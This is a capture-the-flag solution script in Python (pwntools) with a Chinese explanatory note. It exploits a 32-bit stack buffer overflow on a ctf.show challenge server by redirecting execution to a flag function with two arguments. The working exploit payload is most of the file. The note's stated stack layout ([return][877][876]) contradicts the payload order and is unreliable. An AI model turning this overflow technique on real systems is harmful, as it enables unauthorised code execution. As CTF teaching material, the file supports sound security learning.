from pwn import *

p = remote('pwn.challenge.ctf.show', 28148)

flag_addr = 0x8048586

offset = 0x6c + 4

payload = b'a' * offset + p32(flag_addr) + p32(0) + p32(876) + p32(877)

p.sendline(payload)

p.interactive()

"""
【知识点讲解】
1. 题目类型：ret2text - 带参数的函数调用
2. 函数原型分析：
   - flag函数可能需要多个参数
   - 例如：void flag(int a, int b)
3. payload结构：
   b'a' * offset     - 填充到返回地址
   + p32(flag_addr)  - 返回地址指向flag函数
   + p32(0)          - flag的返回地址
   + p32(876)        - flag的第一个参数
   + p32(877)        - flag的第二个参数
4. 32位多参数传递：
   - 参数从右到左入栈
   - 调用flag(876, 877)时，栈布局：
     [返回地址] [877] [876]
5. 参数值876和877：
   - 可能是题目给定的特定值
   - 或者是flag函数的内部检查条件
6. 关键点：理解32位函数多参数传递的栈布局
"""
